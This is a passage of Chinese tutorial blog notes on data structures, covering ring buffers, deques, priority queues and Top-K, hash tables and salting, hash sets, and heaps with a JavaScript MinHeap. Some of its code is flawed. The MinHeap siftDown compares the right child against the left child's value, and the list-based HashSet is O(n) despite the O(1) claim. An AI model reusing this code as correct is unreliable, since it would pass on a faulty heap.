操作系统的进程调度：**操作系统可以使用环形数组来实现轮转调度算法**，循环分配CPU时间给不同的进程。\n    - **定时任务**管理：在需要周期性执行任务的系统中，环形数组可以用来管理这些任务的执行顺序。\n3. 数据流处理\n    - 滑动窗口算法：在处理时间序列数据时，环形数组可以高效地实现滑动窗口，用于计算移动平均等指标。\n    - 实时数据分析：保存**最近N个数据点**进行实时分析和统计。\n4. 游戏开发\n    - 回放功能：在游戏中实现最近N秒的即时回放功能。\n    - 循环地图：一些2D游戏中的无限循环地图可以用环形数组来实现。\n5. 内存管理\n    - 内存分配器：某些内存分配算法使用环形数组来管理内存块。\n6. 通信系统\n    - 消息队列：在生产者-消费者模型中，环形缓冲区可以用作消息队列。\n7. 历史记录管理\n    - 命令历史：保存用户最近执行的N个命令，以便快速访问。\n    - 浏览器历史：管理浏览器的前进/后退功能。\n8. 数据压缩\n    - LZ77等压缩算法：在某些数据压缩算法中，环形缓冲区用于存储最近处理过的数据。\n9. 实时系统\n    - 传感器数据处理：在实时系统中，环形缓冲区可以用于存储和处理来自传感器的连续数据流。\n10. 数据库系统\n    - 日志管理：某些数据库系统使用环形缓冲区来管理事务日志。\n\n## 6. 列队的使用场景\n\n- 任何需要实现“先来后到”功能的场景，例如打印机的任务队列、餐厅的出餐队列等，队列在这些场景中可以有效地维护处理顺序。\n- 又比如购物者下单后，订单将加入队列中，系统随后会根据顺序处理队列中的订单\n","FoFMxfNa":"\n# 双向队列：Python 描述\n\n`#双向队列` `#列队` `#数据结构` \n\n\n\n## 目录\n<!-- toc -->\n ## 1. 定义 \n\n双向队列兼具**栈与队列**的逻辑\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240922112356.png)\n\n其实就相对于 JS 中的 Array 的几个方法\n- 对首入队：unshift\n- 队首出队：shift\n- 队尾入队：push\n- 队尾出队：pop() \n\n## 2. 基于双向链表的实现\n\n**双向链表** 很适合作为双向队列的底层数据结构，如下图\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240922114233.png)\n\n具体实现不展开了\n\n## 3. 基于数组的实现\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240922114337.png)\n\n注意需要维护两个变量：`front` 和 `rear`\n\n具体实现不展开了\n\n## 4. 标准库 deque（双端队列）\n\n\n> [!danger]\n> 是的，它就是类似于的 JavaScript 的 Array，叫法不一样而已\n\n- deque 是 \"double-ended queue\" 的缩写\n- deque 是一个双端队列，允许你在队列的两端高效地进行添加和删除操作。它是线程安全的，并且在两端的操作时间复杂度都是 O(1)\n\n```python\nfrom collections import deque\n\n# deque 的常用方法\n\n# append(e)：向队尾插入元素 e\n\n# appendleft(e)：向队头插入元素 e\n\n# pop()：从队尾删除元素\n\n# popleft()：从队头删除元素\n\n# extend(iterable)：扩展队列，从队尾插入元素\n#   iterable 为可迭代对象，如列表、元组、集合等\n\n# extendleft(iterable)：扩展队列，从队头插入元素\n#   iterable 为可迭代对象，如列表、元组、集合等\n\n# rotate(n)：将队列旋转 n 步\n#  n > 0 时，队列的最右边的 n 个元素会被移动到最左边\n#  n < 0 时，队列的最左边的 n 个元素会被移动到最右边\n\n# reverse()：反转队列\n\n# clear()：清空队列\n\n# count(e)：统计队列中元素 e 的个数\n\n# remove(e)：删除队列中第一个出现的元素 e\n\n# index(e)：返回队列中第一个出现的元素 e 的索引\n\n# insert(i, e)：在索引 i 处插入元素 e\n\n# copy()：复制队列\n\n# maxlen：队列的最大长度，如果为 None 则表示队列长度无限制\n#   maxlen 只能在创建 deque 对象时指定，不能通过方法修改\n#   如果队列长度超过 maxlen，则会从另一端删除元素\n\n```\n\n## 5. 双向列队的作用\n\n\n我们知道，软件的“撤销”功能通常使用栈来实现：系统将每次更改操作 `push` 到栈中，然后通过 `pop` 实现撤销。然而，考虑到系统资源的限制，软件通常会限制撤销的步数（例如仅允许保存 50 步）。当栈的长度超过 50 时，软件需要在栈底（队首）执行删除操作。**但栈无法实现该功能，此时就需要使用双向队列来替代栈**。请注意，“撤销”的核心逻辑仍然遵循栈的先入后出原则，只是双向队列能够更加灵活地实现一些额外逻辑。\n","mdiOnmX5":"\n# 优先级队列及 TopK问题\n\n`#优先级队列`  `#数据结构` \n\n\n\n## 目录\n<!-- toc -->\n ## 总结 \n\n- 为了一定能把写出来，请用 [#2.2.3. 使用 JavaScript 描述：直接使用 sort 方法](/post/mdiOnmX5.html#223-使用-JavaScript-描述直接使用-sort-方法)\n\n## 1. 优先级队列\n\n优先级队列是一种特殊的队列数据结构，举个例子：\n\n想象一下你正在一家繁忙的急诊室工作。在这里，病人不是按照先来后到的顺序就诊，而是根据他们病情的`严重程度（优先级）`来决定谁先接受治疗。这就是一个典型的优先级队列的例子。\n\n让我们详细描述这个场景：\n1. **入队（Enqueue）**： 当病人到达急诊室时，护士会评估他们的情况并分配一个紧急程度等级（比如1-5，1最紧急，5最不紧急）。这相当于将一个元素插入优先级队列。\n2. **出队（Dequeue）**： 医生ready时，会叫下一个病人。但不是叫最早到的，而是叫当前等待中最紧急的病人。这就像从优先级队列中取出最高优先级的元素。\n3. **动态调整**： 如果一个病人的情况突然恶化，护士可能会提高他的紧急程度。这相当于在优先级队列中更新一个元素的优先级。\n4. **多个相同优先级**： 如果有多个病人的紧急程度相同，通常会按照他们到达的顺序处理。这就是优先级队列处理相同优先级元素的方式。\n\n### 1.1. 优先级队列的作用\n\n1. 任务调度：在操作系统中，优先级队列用于管理进程或线程的执行顺序，确保高优先级的任务先执行。\n2. 事件驱动编程：在事件处理系统中，优先级队列可以用来管理事件的处理顺序，确保重要事件得到及时处理。\n3. 图算法：在诸如Dijkstra最短路径算法、Prim最小生成树算法等图算法中，优先级队列用于高效地选择下一个要处理的节点。\n4. 数据压缩：在Huffman编码等数据压缩算法中，优先级队列用于构建Huffman树。\n5. 模拟系统：在离散事件模拟中，优先级队列用于管理事件的发生顺序。\n6. 网络流量控制：在网络传输中，优先级队列可以用来管理数据包的发送顺序，确保重要数据包优先传输。\n\n## 2. 实现优先级队列的方法\n\n优先级队列通常有两种主要的实现方式：\n\n### 2.1. 基于堆（Heap）的实现\n\n这是最常用和最高效的实现方式。通常使用二叉堆（Binary Heap）来实现。\n\n   ```python\nimport heapq\n\nclass PriorityQueue:\n   def __init__(self):\n\t   self._queue = []\n\t   self._index = 0\n\n   def push(self, item, priority):\n\t   heapq.heappush(self._queue, (-priority, self._index, item))\n\t   self._index += 1\n\n   def pop(self):\n\t   return heapq.heappop(self._queue)[-1]\n   ```\n\n这个实现利用了Python的heapq模块，它提供了堆队列算法的实现。我们使用负的优先级值是因为heapq实现的是最小堆，而我们通常需要最大优先级先出队。\n\n### 2.2. 基于有序数组的实现\n\n#### 2.2.1. 使用 python 描述\n\n这种方法在插入时保持元素有序，出队时直接取第一个元素。\n\n   ```python\n# 优先级队列：基于有序列表的实现\nclass PriorityQueue:\n    def __init__(self):\n        # 用于存储元素的列表\n        self.queue = []\n\n    # 判断队列是否为空\n    def isEmpty(self):\n        return len(self.queue) == 0\n\n    # 插入元素,需要传入两个参数，插入以后按照优先级排序\n    #   item: 待插入的元素\n    #   priority: 优先级\n    def push(self, item, priority):\n        self.queue.append((item, priority))\n        self.queue.sort(key=lambda x: x[1])\n\n    # 移除元素，返回优先级最高的元素，即返回列表的第一个元素\n    def pop(self):\n        # 参数 0 表示移除并返回列表的第一个元素\n        return self.queue.pop(0)\n\n   ```\n\n这种实现方法简单直观，但在大规模数据时效率较低，因为每次插入都需要重新排序\n\n#### 2.2.2. 使用 JavaScript 描述：遍历查找插入合适的位置\n\n```js hl:16\n// 优先级队列实现：使用有序数组实现\n\nclass PriorityQueue {\n  constructor() {\n    this.queue = [];\n  }\n\n  enqueue(element) {\n    // 如果队列为空，直接插入\n    if (this.isEmpty()) {\n      this.queue.push(element);\n      // 如果队列不为空，按照优先级插入\n    } else {\n      // 标识是否插入过了\n      let added = false;\n      // 遍历，找到合适的位置插入\n      for (let i = 0; i < this.queue.length; i++) {\n        if (element.priority < this.queue[i].priority) {\n          this.queue.splice(i, 0, element);\n          added = true;\n          break;\n        }\n      }\n      // 如果没有插入过，说明优先级最低，直接插入到队尾\n      if (!added) {\n        this.queue.push(element);\n      }\n    }\n  }\n\n  dequeue() {\n    return this.queue.shift();\n  }\n\n  front() {\n    return this.queue[0];\n  }\n\n  isEmpty() {\n    return this.queue.length === 0;\n  }\n\n  size() {\n    return this.queue.length;\n  }\n}\n\n```\n\n#### 2.2.3. 使用 JavaScript 描述：直接使用 sort 方法\n\n```javascript hl:11\n// 优先级队列实现：直接使用 sort 方法\n\nclass PriorityQueue {\n  constructor() {\n    this.queue = [];\n  }\n\n  // 入优\n  enqueue(element) {\n    this.queue.push(element);\n    // 最简单的实现方式，每次插入元素后，都对队列进行排序\n    this.queue.sort((a, b) => {\n      return a.priority - b.priority;\n    });\n  }\n\n  // 出队\n  dequeue() {\n    return this.queue.shift();\n  }\n\n  // 返回队首元素\n  front() {\n    return this.queue[0];\n  }\n\n  // 是否为空\n  isEmpty() {\n    return this.queue.length === 0;\n  }\n\n  // 队列大小\n  size() {\n    return this.queue.length;\n  }\n}\n\n```\n\n\n### 2.3. 如何选择实现方式\n\n选择哪种实现方法取决于具体的应用场景：\n\n- 如果需要**频繁地插入和删除元素**，并且数据量较大，那么基于堆的实现更为合适，因为它的时间复杂度为`O(log n)`。\n- 如果数据量较小，或者插入操作不频繁，而查找操作较多，那么基于有序数组的实现可能更简单且足够高效。\n\n## 3. Tok-K 问题\n\n### 3.1. 方法一：排序\n\n```python\n\n# top-k 问题：使用排序算法，时间复杂度为O(nlogn)\ndef topk(arr, k):\n    arr.sort(reverse=True)\n    return arr[:k]\n\n```\n\n### 3.2. 方法二：使用堆数据结构（heapq）\n\n直接使用 `heapq.nlargest`\n\n```python\n# tok-k 问题：使用堆排序算法，时间复杂度为O(nlogk)\n# 优先级队列：基于堆的实现\n\nimport heapq\n\ndef topk2(arr, k):\n    return heapq.nlargest(k, arr)\n\n```\n\n使用堆的特性，维护 topk 的堆\n\n```python\nimport heapq\n\ndef top_k_heap(nums: list[int], k: int) -> list[int]:\n    \"\"\"基于堆查找数组中最大的 k 个元素\"\"\"\n    # 初始化小顶堆\n    heap = []\n    # 将数组的前 k 个元素入堆\n    for i in range(k):\n        heapq.heappush(heap, nums[i])\n    # 从第 k+1 个元素开始，保持堆的长度为 k\n    for i in range(k, len(nums)):\n        # 若当前元素大于堆顶元素，则将堆顶元素出堆、当前元素入堆\n        if nums[i] > heap[0]:\n            heapq.heappop(heap)\n            heapq.heappush(heap, nums[i])\n    return heap\n```","hJhrbEBB":"\n# 优先级队列：Leetcode 中提供的数据结构介绍\n\n\n\n\n## 目录\n<!-- toc -->\n ## 队列类型 \n\n这个库提供了3种优先队列实现：\n\n1. **PriorityQueue**: 通用优先队列，需要自定义比较器\n2. **MinPriorityQueue**: 最小优先队列，数值越小优先级越高\n3. **MaxPriorityQueue**: 最大优先队列，数值越大优先级越高\n\n## 基本用法\n\n### 2. 创建队列\n\n#### 2.1 通用 PriorityQueue\n\n```javascript\n// 创建一个自定义比较器的优先队列\nconst customQueue = new PriorityQueue({\n  compare: (a, b) => {\n    // 返回 <= 0 表示不交换位置\n    // 返回 > 0 表示交换位置\n    return a.priority - b.priority;\n  }\n});\n```\n\n#### 2.2 最小优先队列\n\n```javascript\n// 简单数字优先队列\nconst minQueue = new MinPriorityQueue();\n\n// 对象优先队列，指定优先级获取方式为 .value\nconst objectMinQueue = new MinPriorityQueue({ \n  priority: (obj) => obj.value \n});\n```\n\n#### 2.3 最大优先队列\n\n```javascript\n// 简单数字优先队列\nconst maxQueue = new MaxPriorityQueue();\n\n// 对象优先队列，指定优先级获取方式\nconst objectMaxQueue = new MaxPriorityQueue({ \n  priority: (obj) => obj.value \n});\n```\n\n### 3. 核心 API\n\n#### 3.1 入队 (enqueue)\n\n```javascript\n// 基础入队\nqueue.enqueue(element);\n\n// 带优先级入队（适用于 Min/MaxPriorityQueue）\nqueue.enqueue(element, priority);\n```\n\n#### 3.2 出队 (dequeue)\n\n```javascript hl:2\nconst element = queue.dequeue();\n// PriorityQueue: 返回元素本身\n// Min/MaxPriorityQueue: 返回 { priority, element } 对象\n```\n\n#### 3.3 查看队首元素 (front)\n\n```javascript\nconst frontElement = queue.front();\n// 不移除元素，只返回队首元素\n```\n\n#### 3.4 查看队尾元素 (back)\n\n```javascript\nconst backElement = queue.back();\n// 返回优先级最低的元素\n```\n\n#### 3.5 其他实用方法\n```javascript\n// 检查队列是否为空\nqueue.isEmpty(); // 返回 boolean\n\n// 获取队列大小\nqueue.size(); // 返回 number\n\n// 转换为数组（按优先级排序）\nqueue.toArray(); // 返回数组\n\n// 清空队列\nqueue.clear();\n```\n\n### 4. 实际应用示例\n\n#### 4.1 简单数字优先队列\n\n```javascript\nconst minQueue = new MinPriorityQueue();\n\n// 添加元素\nminQueue.enqueue(10);\nminQueue.enqueue(5);\nminQueue.enqueue(15);\n\nconsole.log(minQueue.dequeue()); // { priority: 5, element: 5 }\nconsole.log(minQueue.dequeue()); // { priority: 10, element: 10 }\n```\n\n#### 4.2 对象优先队列\n\n```javascript\nconst taskQueue = new MaxPriorityQueue({\n  priority: (task) => task.priority\n});\n\n// 添加任务\ntaskQueue.enqueue({ id: 1, name: \"任务1\", priority: 3 });\ntaskQueue.enqueue({ id: 2, name: \"任务2\", priority: 1 });\ntaskQueue.enqueue({ id: 3, name: \"任务3\", priority: 4 });\n\n// 处理最高优先级任务\nconsole.log(taskQueue.dequeue()); \n\n// { priority: 4, element: { id: 3, name: \"任务3\", priority: 4 } }\n\n```\n\n\n\n","NVBk25aM":"\n# 哈希表\n\n`#2024/08/11` `#算法` `#数据结构` \n\n\n## 目录\n<!-- toc -->\n ## 目录 \n\n- 哈希表（Hash Table）：使用哈希函数将键映射到存储桶的位置，实现快速查找。\n\t- 详见 [1. 哈希表概述](/post/Uj5TsfzB.html)\n- 哈希集合（Hash Set）：一种去重集合，通常使用哈希表实现。\n\t- [2. 哈希集合](/post/181hMjps.html)\n\n## 本章内容小节\n\n- 输入 `key` ，哈希表能够在 O(1) 时间内查询到 `value` ，效率非常高。\n- **常见的哈希表操作**包括查询、添加键值对、删除键值对和遍历哈希表等。\n- 哈希函数将 `key` 映射为数组索引，从而访问对应桶并获取 `value` 。\n- 两个不同的 `key` 可能在经过哈希函数后得到相同的数组索引，导致查询结果出错，这种现象被称为**哈希冲突**。\n- 哈希表容量越大，哈希冲突的概率就越低。因此可以通过扩容哈希表来缓解哈希冲突。与数组扩容类似，哈希表扩容操作的开销很大。\n- **负载因子**定义为哈希表中元素数量除以桶数量，反映了哈希冲突的严重程度，常用作触发哈希表扩容的条件。\n- **链式地址**通过将单个元素转化为链表，将所有冲突元素存储在同一个链表中。然而，链表过长会降低查询效率，可以通过进一步将链表转换为红黑树来提高效率。\n- **开放寻址**通过多次探测来处理哈希冲突。**线性探测**使用固定步长，缺点是不能删除元素，且容易产生聚集。多次哈希使用多个哈希函数进行探测，相较线性探测更不易产生聚集，但多个哈希函数增加了计算量。\n- 不同编程语言采取了不同的哈希表实现。\n\t- 例如，Java 的 `HashMap` 使用链式地址\n\t- 而 Python 的 `Dict` 采用开放寻址。\n- 在哈希表中，我们希望哈希算法具有确定性、高效率和均匀分布的特点。\n- 在密码学中，哈希算法还应该具备抗碰撞性和雪崩效应。\n- 哈希算法通常采用大质数作为模数，以最大化地保证哈希值均匀分布，减少哈希冲突。\n- 常见的哈希算法包括 MD5、SHA-1、SHA-2 和 SHA-3 等。MD5 常用于校验文件完整性，SHA-2 常用于安全应用与协议。\n- 编程语言通常会为数据类型提供内置哈希算法，用于计算哈希表中的桶索引。通常情况下，只有不可变对象是可哈希的。","Uj5TsfzB":"\n# 哈希表概述\n\n`#哈希表` `#hash` `#数据结构`  `#2024/09/22` \n\n\n## 目录\n<!-- toc -->\n ## 1. 哈希表的价值 \n\n看下图数组、链表、及哈希的增删改成的复杂度就知道其价值了 \n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240922161703.png)\n## 2. 哈希表和 Map（键值映射）的关系？\n\n- 哈希表是一种具体的**数据结构**\n\t- 它使用哈希函数将键映射到存储桶或槽中，从而实现高效的插入、删除和查找操作。\n\t- 是许多高级编程语言中 Map 或字典实现的底层数据结构\n\t- 哈希表是一个具体的**数据结构**，描述了如何组织数据。\n- Map 是一个抽象数据类型\n\t- Map 是一个**抽象数据类型**，它定义了一种存储键值对并允许通过键快速查找值的结构\n\t- 它定义了行为但不指定实现\n- 哈希表是实现 Map 的一种常见且高效的方式，但不是唯一的方式\n- 在许多编程语言中，默认的 Map 或字典实现通常基于哈希表\n\t- Python 中 `dict` 类型是 Map 的一种实现，内部使用**哈希表**\n\n```python\n# 创建一个字典（Map）\nmy_dict = {\"apple\": 1, \"banana\": 2, \"orange\": 3}\n\n# 插入新的键值对\nmy_dict[\"grape\"] = 4\n\n# 查找值\nprint(my_dict[\"banana\"])  # 输出：2\n\n# 删除键值对\ndel my_dict[\"orange\"]\n\n# 遍历键值对\n# items() 方法返回一个包含所有字典项的列表\n# 类似于 JavaScript 中的 Object.entries()\nfor key, value in my_dict.items():\n    print(f\"{key}: {value}\")\n\n# 检查键是否存在\nif \"apple\" in my_dict:\n    print(\"Apple is in the dictionary\")\n```\n\n## 3. 哈希表的三种方式遍历方式\n\n```python\n# 遍历哈希表\n# 遍历键值对 key->value\nfor key, value in hmap.items():\n    print(key, \"->\", value)\n# 单独遍历键 key\nfor key in hmap.keys():\n    print(key)\n# 单独遍历值 value\nfor value in hmap.values():\n    print(value)\n```\n\n## 4. 哈希表的基本原理\n\n底层是数组，存在数组的哪个索引取决于`hash(key)`\n- 哈希表可以理解为一个加强版的数组\n- 数组可以通过索引（非负整数）在 `O(1)` 的时间复杂度内查找到对应元素。\n- 哈希表是类似的，可以通过 `key` 在 `O(1)` 的时间复杂度内查找到这个 `key` 对应的 `value`。`key` 的类型可以是数字、字符串等多种类型。\n\n看下伪码\n\n```python\n# 哈希表伪码逻辑\nclass MyHashMap:\n\n    def __init__(self):\n        self.table = [None] * 1000\n\n    # 增/改，复杂度 O(1)\n    def put(self, key, value):\n        index = self.hash(key)\n        self.table[index] = value\n\n    # 查，复杂度 O(1)\n    def get(self, key):\n        index = self.hash(key)\n        return self.table[index]\n\n    # 删，复杂度 O(1)\n    def remove(self, key):\n        index = self.hash(key)\n        self.table[index] = None\n\n    # 哈希函数，把 key 转化成 table 中的合法索引\n    # 时间复杂度必须是 O(1)，才能保证上述方法的复杂度都是 O(1)\n    def hash(self, key):\n        # ...\n        return hash(key) % len(self.table)\n\n```\n\n## 5. 哈希函数（哈希算法）\n\n**哈希函数**的作用是把`任意长度的输入（key）`转化成`固定长度的输出（索引）`\n- key 的长度任意\n- 索引需要合法，比如在数组长度范围内\n\n### 5.1. 最简单的哈希算法\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240922160729.png)\n\n### 5.2. 常见的哈希算法\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240922160829.png)\n\n## 6. 盐值的主要作用\n\n1. 防御彩虹表攻击\n\t- 彩虹表是一种预计算的哈希值表，用于加速密码破解过程。通过为每个密码添加唯一的盐值，可以使预计算的彩虹表变得无效，因为攻击者需要为每个可能的盐值创建一个新的彩虹表，这在计算上是不可行的。\n2. 防止相同密码产生相同的哈希值\n\t- **如果两个用户使用相同的密码**，没有盐值的情况下，它们的哈希值将会相同。使用盐值可以确保即使密码相同，最终的哈希值也会不同，增加了安全性。\n3. 增加密码的复杂性\n\t- 盐值增加了原始密码的长度和复杂性，使得暴力破解和字典攻击变得更加困难。\n4. 缓解密码重用的风险\n\t- 如果用户在多个系统中使用相同的密码，盐值可以确保即使一个系统被攻破，其他系统的密码哈希也不会立即受到威胁。\n\n比如 **因为 Python 解释器在每次启动时，都会为字符串哈希函数加入一个随机的盐（salt）值**。这种做法可以有效防止 HashDoS 攻击，提升哈希算法的安全性\n\n## 7. 哈希冲突\n\n哈希冲突是一定会出现的，因为这个 `hash` 函数相当于：是把一个**无穷大**的空间映射到了一个**有限的**索引空间，所以必然会有不同的 `key` 映射到同一个索引上\n\n就好比三维物体映射到二维影子一样，这种有损压缩必然会出现信息丢失，有损信息本就无法和原信息一一对应\n\n### 7.1. 解决哈希冲突的两种方式：拉链法和线性探查法\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240922152659.png)\n\n- 拉链法相当于是哈希表的底层数组并不直接存储 `value` 类型，而是存储一个链表，当有多个不同的 `key` 映射到了同一个索引上，这些 `key -> value` 对儿就存储在这个链表中，这样就能解决哈希冲突的问题。\n- 而线性探查法的思路是，一个 `key` 发现算出来的 `index` 值已经被别的 `key` 占了，那么它就去 `index + 1` 的位置看看，如果还是被占了，就继续往后找，直到找到一个空的位置为止\n\n### 7.2. 拉链法：链式地址\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240922160159.png)\n\n具体事项方式不展开了\n### 7.3. 线性探测法\n\n- 线性探测\n- 平方探测\n- 多次哈希\n\n具体实现方式不展开了\n\n## 8. 负载因子\n\n负载因子是度量一个哈希表装满的程度指标。一般来说，负载因子越大，说明哈希表里面存储的 `key-value` 对越多，哈希冲突的概率就越大，哈希表的操作性能就越差\n\n当哈希表内元素达到负载因子时，哈希表就会扩容。\n\n## 9. 哈希表的增删查改效率一定是 `O(1)` 吗？\n\n不一定，只有哈希函数的复杂度是 `O(1)`，且合理解决哈希冲突的问题，才能保证增删查改的复杂度是 `O(1)`，不然可能会退化为 `O(n)`\n\n","181hMjps":"\n# 哈希集合\n\n`#哈希集合` `#set` `#数据结构` \n\n**哈希表的键，其实就是哈希集合**\n\n哈希集合的主要使用场景是「**去重**」，因为它的特性是：**不会出现重复元素，可以在 `O(1)` 的时间增删元素，可以在 `O(1)` 的时间判断一个元素是否存在**\n\n\n```python\n\n# 实现\u001bHashSet\nclass Hashset:\n    def __init__(self):\n        self.hashset = []\n\n    def add(self, key):\n        if key not in self.hashset:\n            self.hashset.append(key)\n\n    def remove(self, key):\n        if key in self.hashset:\n            self.hashset.remove(key)\n\n    def contains(self, key):\n        return key in self.hashset\n\n    def __str__(self):\n        return str(self.hashset)\n\n```","ncAM4mT8":"\n#  0. 前言\n\n`#二叉树`  `#二叉树/前言`  \n\n包括\n\n- 所有二叉树\n- 二叉搜索树\n- 多叉树\n- 二叉树的遍历\n- 二叉树的深度\n","WPl82suJ":"\n# 树的一些基本概念\n\n\n`#算法/二叉树` `#算法/树`  `#算法/数据结构` `#2023/04/18`\n\n\n## 目录\n<!-- toc -->\n ## 1. 二叉树、满二叉树、完全二叉树 \n\n这里着重说下`完全二叉树`：\n\n- 叶子节点都在 `最底下两层`\n- 最后一层叶子节都靠`左排列`\n- 并且`除了最后一层`，其他层的节点个数都要达到最大\n\n![|592](https://832-1310531898.cos.ap-beijing.myqcloud.com/9a9462b0ae355f83607ec904d5df7553.png)\n![|568](https://832-1310531898.cos.ap-beijing.myqcloud.com/05dd6048d8688e6a58ef6e8518485942.png)\n\n## 2. 堆、大顶堆、小顶堆\n\n### 2.1. 堆的基本概念\n\n- `堆`是一个`完全二叉树`。\n- `堆`中 `每个节点`的值都 `大于等于（或者小于等于）`其`左右子节点`的值\n   - 大的再上面，`大顶堆`\n   - 小的再上面，`小顶堆`\n\n![](https://832-1310531898.cos.ap-beijing.myqcloud.com/c75df744c97e5b34e295bbd2eacaf267.png)\n\n### 2.2. 堆的价值\n\n#### 2.2.1. **大顶堆**的价值\n\n- 优先队列\n- 高效排序\n- 高效的动态中位数\n\n#### 2.2.2. **小顶堆**的价值\n主要价值和应用：\n\n- 优先队列：小顶堆也常用于实现优先队列，支持快速获取和删除最小元素。\n- 图算法：在图算法中，小顶堆用于实现 Dijkstra 最短路径算法和 Prim 最小生成树算法，以快速找到权重最小的边或路径。\n- 合并有序列表：小顶堆可以高效地合并多个有序列表，例如用于外部排序或归并排序\n\n##### 2.2.2.1. 堆的总体价值\n\n- **高效的插入和删除操作**：堆支持 `O(log n)` 的插入和删除操作，使其在需要频繁调整元素顺序的场景中非常高效。\n- **内存利用率高**：堆是一种基于数组实现的数据结构，内存利用率高，不需要额外的指针或链接。\n- 广泛应用：堆在各种算法和系统中有广泛应用，包括调度系统、内存管理、图算法、实时数据处理等。\n\n总之，堆结构因其高效的插入、删除和查找操作，在许多需要维护动态有序集合的场景中具有重要价值。\n\n### 2.3. 实现一个`小顶堆`\n\n使用`数组`来存储，代码如下：\n\n- 关键是 `this.head = []`  来存储\n\n```javascript\nfunction swap(array, a, b) {\n    [array[a], array[b]] = [array[b], array[a]];\n}\n\nclass MinHeap {\n    constructor() {\n        // 使用数组来存储\n        this.heap = [];\n    }\n\n    // 左孩子的索引\n    getLeftIndex(index) {\n        return (2 * index) + 1;\n    }\n\n    // 右孩子的索引\n    getRightIndex(index) {\n        return (2 * index) + 2;\n    }\n\n    // 父节点的索引\n    getParentIndex(index) {\n        if (index === 0) {\n            return 0;\n        }\n        return Math.floor((index - 1) / 2);\n    }\n\n    // 返回个数\n    size() {\n        return this.heap.length;\n    }\n\n    isEmpty() {\n        return this.size() <= 0;\n    }\n\n    clear() {\n        this.heap = [];\n    }\n    // ::::小顶堆，最小的肯定在最上面\n    findMinimum() {\n        return this.isEmpty() ? null : this.heap[0];\n    }\n\n    // 插入一个值，插入的元素添加到堆底的最后，然后让其上浮到正确位置（如果大顶的话）\n    insert(value) {\n        if (value != null) {\n            const index = this.heap.length;\n            // 先放在最后一位\n            this.heap.push(value);\n            // 父节点向上移动，直到父节点小于插入的值\n            this.siftUp(index);\n            return true;\n        }\n        return false;\n    }\n\n    // 下沉，堆化，递归\n    siftDown(index) {\n        // 插入的元素的位置\n        let element = index;\n        const left = this.getLeftIndex(index);\n        const right = this.getRightIndex(index);\n        const size = this.size();\n\n        if (left < size  // base 判断\n            && this.heap[element] > this.heap[left] \n            // 如果该元素大于它的左子节点，则下沉\n        ) {\n            element = left;\n        }\n\n        if (right < size // base判断\n            && this.heap[element] > this.heap[left]  \n            // 如果该元素大于它的右子节点，则下沉\n        ) {\n            element = right;\n        }\n\n        // 如果element 最后 和传入的index不一样了，说明需要交换数据，然后继续下沉递归\n        if (index !== element) {\n            swap(this.heap, index, element);\n            this.siftDown(element);\n        }\n\n    }\n\n    // 向上移动，直到父节点的值小于插入的值\n    siftUp(index) {\n        let parent = this.getParentIndex(index);\n        while (\n            index > 0 // base 判断\n            && this.heap[parent] > this.heap[index]) // 父节点的元素大于子元素的时候，才需要移动\n        {\n            swap(this.heap, parent, index);\n            index = parent;\n            parent = this.getParentIndex(index);\n        }\n    }\n\n    // delete min 堆顶元素（最小值）和 堆底元素 对调\n    // 1、删除删除堆顶元素\n    // 2、让堆底元素沉到正确位置\n    deleteMin() {\n        if (this.isEmpty()) {\n            return null;\n        }\n        if (this.size() === 1) {\n            return this.heap.shift();\n        }\n        const removedValue = this.heap[0]; // 堆顶元素\n        const lastElement = this.heap.pop();  // 移除堆底元素\n        this.heap[0] = lastElement; // 将 堆顶元素 赋值为 堆底元素\n        // 从堆顶开始下沉\n        this.siftDown(0);\n        return removedValue;\n    }\n\n    getAsArray() {\n        return this.heap;\n    }\n}\n\nlet arr = [5, 3, 7, 9, 0, 0, -1, -2, 7, -8];\n\nlet heapObj = new MinHeap();\narr.forEach((item) => {\n    heapObj.insert(item)\n})\nconsole.log(heapObj);\nconsole.log('************************')\n\nconsole.log(heapObj.findMinimum());\n\n// MinHeap { heap: [\n//     -8, -2, 0, 3, -1,\n//      7,  0, 9, 7,  5\n//   ] }\n// ************************\n// -8\n\n```\n\n## 3. 疑问：数据结构中的`堆栈` 与 内存中的`堆栈` 的区别？\n\n![|568](https://832-1310531898.cos.ap-beijing.myqcloud.com/1b4993fbc44e95f344a1f3bd840babd4.png)\n![|568](https://832-1310531898.cos.ap-beijing.myqcloud.com/86921645374e40f809a54fb522b7f5f1.png)\n\n堆内存（Heap Memory）和栈内存（Stack Memory）是计算机内存管理中两种不同的内存分配区域。它们在用途、管理方式、生命周期和性能上有显著区别。以下是它们的主要区别：\n\n### 3.1. 用途\n\n- **堆内存**\n   - 用于动态分配内存，通常由程序运行时分配和释放。\n   - 适用于需要在运行时决定大小和生命周期的对象和数据结构，例如动态数组、链表等。\n- **栈内存**\n   - 用于静态分配内存，主要用于函数调用、局部变量和函数参数。\n   - 适用于生命周期明确且较短的变量，例如局部变量和函数参数。\n\n### 3.2. 管理方式\n\n- **堆内存**：\n   - 内存管理较复杂，容易导致内存泄漏和碎片化问题。\n   - 由程序员显式分配（如 `malloc` 在 C/C++ 中，`new` 在 C++/Java 中）和释放（如 `free` 在 C/C++ 中，垃圾回收在 Java 中）。\n- **栈内存**：\n   - 内存管理简单，不会出现内存泄漏问题，但栈空间有限，不能用于大对象或长生命周期对象。\n   - 由编译器自动管理，内存分配和释放在函数调用和返回时自动进行。\n\n### 3.3. 生命周期\n\n- **堆内存**：\n   - 对象的生命周期由程序员控制，可以在程序运行过程中**动态分配和释放**。\n   - 对象在不再使用后需要显式释放，否则会导致**内存泄漏**。\n- **栈内存**\n   - 对象的生命周期由函数调用栈决定，当函数返回时，栈上的所有**局部变量自动销毁**。\n   - 生命周期短暂且明确，不需要显式释放。\n\n### 3.4. 性能\n\n- **堆内存**：\n   - 